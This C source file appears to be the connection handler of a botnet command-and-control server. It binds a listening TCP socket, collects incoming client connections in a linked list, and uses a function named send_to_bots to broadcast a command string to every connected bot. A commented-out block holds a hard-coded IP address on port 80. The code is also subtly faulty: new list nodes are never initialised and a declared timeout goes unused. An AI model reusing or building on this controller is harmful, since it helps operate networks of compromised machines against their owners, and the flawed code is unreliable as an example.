#include "conn_handler.h"

extern CONNS cons;
extern int main_sock;
extern short port;

int make_socket(void)
{
	int s;
	if((s = socket(AF_INET , SOCK_STREAM , 0)) == ERROR)	{
		perror("Failed to create socket");
		exit(1);
	}
	return s;
}

void *accept_handler(void)
{
	struct connections *connects = &cons;
	struct timeval timeout={4,0};
	int tr = 1;
	if (setsockopt(main_sock, SOL_SOCKET, SO_REUSEADDR, &tr, sizeof(int)) == ERROR) {
    	perror("setsockopt");
    }

	while(1){
		int addrlen = sizeof(struct sockaddr);
		
		if((connects->sock = accept(main_sock, (struct sockaddr *)&connects->client_conn, &addrlen)) == ERROR){
			perror("accept failed");
			continue;
		}

		connects->next = (struct connections *) malloc(sizeof (struct connections));
		connects = connects->next;
	
	}
}

void send_to_bots(char *data)
{
	struct connections *connects = &cons;
	while(connects != NULL && connects->sock != 0){

		int ret = write(connects->sock, data, strlen(data));
		// DEBUG
		printf("%d\n", ret);
		connects = connects->next;
	}
}

void bind_socket(struct sockaddr_in *serverAddr)
{
	memset(serverAddr, 0, sizeof(struct sockaddr_in));
	serverAddr->sin_family = AF_INET;
	serverAddr->sin_port = htons(port);
	serverAddr->sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(main_sock, (struct sockaddr *)serverAddr, sizeof(struct sockaddr)) == ERROR){
		perror("Failed to bind the Socket");
		exit(1);
	}
}

/*
server.sin_addr.s_addr = inet_addr("74.125.235.20");
    server.sin_family = AF_INET;
    server.sin_port = htons( 80 );
*/